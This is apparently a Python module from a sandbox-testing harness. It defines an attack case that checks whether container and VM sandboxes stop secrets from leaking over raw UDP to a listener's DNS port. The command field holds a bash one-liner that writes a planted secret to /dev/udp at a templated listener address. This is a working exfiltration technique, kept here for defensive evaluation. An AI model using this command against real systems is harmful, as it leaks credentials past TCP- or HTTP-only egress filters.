"""Network exfiltration over UDP/DNS: a different transport than the HTTP attack,
so a sandbox that only filters TCP (or only inspects HTTP-shaped traffic) doesn't
get credit for blocking exfiltration in general. Default config -- no special
setup, since a container has outbound UDP unless something restricts it.

Sends the secret as a raw UDP datagram, not a well-formed DNS query: a real
exfiltration attempt wouldn't necessarily cooperate with the wire format, and
harness/listener.py logs the raw bytes of anything it receives on the DNS port
precisely so this doesn't need to be a valid DNS packet to be caught.
"""
from .base import Attack

ATTACK = Attack(
    name="network_dns_exfil",
    category="network",
    description="Send a planted secret as a raw UDP datagram to the attacker listener's DNS port",
    # no e2b equivalent: a Cloudflare quick tunnel is HTTP(S)-only. nono can
    # reach the bridge gateway directly (same host as the VM itself). openshell
    # likewise runs its own sandboxed rootfs on this same VM host. firecracker
    # is on its own tap link; see network_http_exfil.py's note on the same point.
    targets=("docker", "gvisor", "nono", "openshell", "firecracker"),
    command=(
        "timeout {timeout_margin} bash -c "
        "'echo -n \"{secret}\" > /dev/udp/{listener_ip}/{listener_dns_port}'"
    ),
    timeout=6.0,
    notes="Tests default UDP egress; complements network_http_exfil's TCP path.",
)
